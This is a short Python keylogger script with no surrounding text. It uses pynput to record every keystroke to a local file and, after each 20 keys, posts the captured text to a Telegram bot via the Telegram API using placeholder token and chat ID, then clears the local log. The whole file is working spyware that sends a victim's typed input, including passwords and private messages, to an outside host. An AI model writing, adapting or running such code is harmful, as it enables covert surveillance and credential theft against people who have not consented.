from pynput import keyboard
import requests

log_file = "keylog.txt"
BOT_TOKEN = "your_bot_token"
CHAT_ID = "your_chat_id"

key_count = 0
key_log = []

def send_to_telegram():
    message = "".join(key_log)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def on_press(key):
    global key_count, key_log
    try:
        log_entry = key.char
    except AttributeError:
        log_entry = f" [{key}] "
    
    with open(log_file, "a") as f:
        f.write(log_entry)
    
    key_log.append(log_entry)
    key_count += 1
    
    if key_count >= 20:
        send_to_telegram()
        key_count = 0
        key_log = []
        with open(log_file, "w") as f:
            f.write("")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
